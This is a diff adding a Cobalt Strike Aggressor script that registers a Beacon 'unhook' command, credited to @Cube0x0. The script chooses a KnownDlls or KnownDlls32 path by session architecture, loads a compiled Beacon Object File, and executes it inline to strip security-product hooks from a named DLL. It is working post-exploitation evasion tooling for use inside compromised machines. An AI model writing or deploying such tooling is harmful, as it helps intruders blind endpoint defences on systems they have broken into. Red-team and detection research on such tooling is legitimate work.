@@ -1,0 +1,39 @@
+#Register command
+beacon_command_register(
+    "unhook",
+    "unhook a specified dll",
+    "Synopsis: unhook <dll>"
+);
+
+alias unhook {
+    local('$barch $handle $data $args $dll $dllpath');
+    println(@_);
+    
+    # figure out the arch of this session
+    $barch = barch($1);
+    $is64 = binfo($1, "is64");
+    if($barch eq "x64" && $is64 == 1)
+    {
+        $dllpath = "\\KnownDlls\\$2"
+    }else{
+        $dllpath = "\\KnownDlls32\\$2"
+    }
+    
+    # read BOF file
+    $handle = openf(script_resource("compiled/unhook-bof $+ .$barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    if(size(@_) == 2)
+    {
+        $args = bof_pack($1, "ZZ", $2, $dllpath);
+    } else {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("unhook"));
+        return;
+    }
+   
+    # 
+    btask($1, "Executing BofUnhook by @Cube0x0");
+    beacon_inline_execute($1, $data, "go", $args);
+}
